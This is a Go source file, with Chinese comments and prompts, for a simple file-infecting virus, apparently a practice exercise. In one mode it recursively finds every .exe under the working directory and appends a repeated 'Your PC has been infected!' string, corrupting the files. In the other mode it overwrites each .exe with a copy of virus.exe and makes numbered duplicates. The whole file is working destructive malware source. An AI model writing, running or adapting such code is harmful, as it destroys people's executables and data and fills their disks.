package main

import (
	"fmt"
	"io"
	"os"
	"strconv"
)

func main() {
	op := 0
	for true {
		fmt.Println("请选择感染方式：")
		fmt.Println("1.追加字符串方式感染")
		fmt.Println("2.顶替源文件方式感染")
		_, err := fmt.Scan(&op)
		check(err)
		if op != 1 && op != 2 {
			fmt.Println("输入选项有误！请重新输入")
		}else {
			break
		}
	}
	if op == 1 {
		fmt.Print("请输入要追加的字符串的数量:")
		var a = 0
		_, _ = fmt.Scan(&a)
		if a > 0 {
			appendString(a)
		}
	}else {
		fmt.Print("请输入要复制的数量:")
		var a = 0
		_, _ = fmt.Scan(&a)
		if a > 0 {
			copyInfect(a)
		}
	}

}
/**
 * 顶替源文件方式感染
 */
func copyInfect(a int)  {
	currentPath,_ := os.Getwd()
	infectDir2(currentPath,currentPath+"\\virus.exe",a)
}


/**
 *追加字符串方式感染
 */
func appendString(a int)  {
	currentPath,_ := os.Getwd()
	infectDir(currentPath,a)
}

func infectDir2(dirPath,virusPath string,a int)  {
	f,err := os.OpenFile(dirPath,os.O_RDONLY,os.ModeDir)
	check(err)
	fileList,err := f.Readdir(-1)
	check(err)
	for _,eachFile := range fileList {
		filePath := dirPath + "\\" +eachFile.Name()
		if eachFile.IsDir() {
			infectDir2(filePath,virusPath,a)
		}else{
			name := []byte(eachFile.Name())
			len := len(name)
			if len >= 4 {
				tpByte := name[len - 4:len]
				tp := string(tpByte)
				if tp == ".exe" {
					infect2(filePath,virusPath,a)
					fmt.Println(filePath+"成功感染!")
				}
			}
		}
	}
}

func infect2(filePath,virusPath string,a int)  {
	_, _ = CopyFile(virusPath, filePath)
	b := []byte(filePath)
	c := b[0:len(b)-4]
	for i := 0; i < a;i++ {
		s := strconv.Itoa(i)
		_, _ = CopyFile(filePath, string(c)+s+".exe")
	}

}

/**
 *使用io.Copy 复制src文件到des
 */
func CopyFile(src, dst string) (int64, error){
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err

}

/**
 * 判断文件是否存在  存在返回 true 不存在返回false
 */
func checkFileIsExist(filename string) bool {
	var exist = true
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		exist = false
	}
	return exist
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

/**
 * 感染一个目录下所有exe 包括子目录
 */
func infectDir(dirPath string,a int)  {
	f,err := os.OpenFile(dirPath,os.O_RDONLY,os.ModeDir)
	check(err)
	fileList,err := f.Readdir(-1)
	check(err)
	for _,eachFile := range fileList {
		filePath := dirPath + "\\" +eachFile.Name()
		if eachFile.IsDir() {
			infectDir(filePath,a)
		}else{
			name := []byte(eachFile.Name())
			len := len(name)
			tpByte := name[len - 4:len]
			tp := string(tpByte)
			if tp == ".exe" && eachFile.Name() != "virus.exe" {
				infect(filePath,a)
				fmt.Println(filePath+"成功感染!")
			}
		}

	}
}
/**
 * 感染一个文件
 */

func infect(filePath string,a int){
	if isInfected(filePath) {
		fmt.Println(filePath+"已经被感染过,无需再感染！")
		return
	}
	var info = []byte("Your PC has been infected!\n")
	var f *os.File
	var err error
	f, err = os.OpenFile(filePath, os.O_APPEND, 0666) //打开文件
	check(err)
	defer f.Close()
	check(err)
	if checkFileIsExist(filePath) { //如果文件存在
		var i = 0
		for i < a {
			_, err = f.Write(info)
			check(err)
			i++
		}
	}
}

/**
 * 追加字符串方式感染 判断文件是否已经被感染 根据结尾的'\n'判断
 */
func isInfected(filePath string) bool {
	f, err := os.Open(filePath)
	check(err)
	defer f.Close()
	_, _ = f.Seek(-1, 2)
	b := make([]byte,1)
	f.Read(b)
	if b[0] == 10 {
		return true
	}
	return false
}

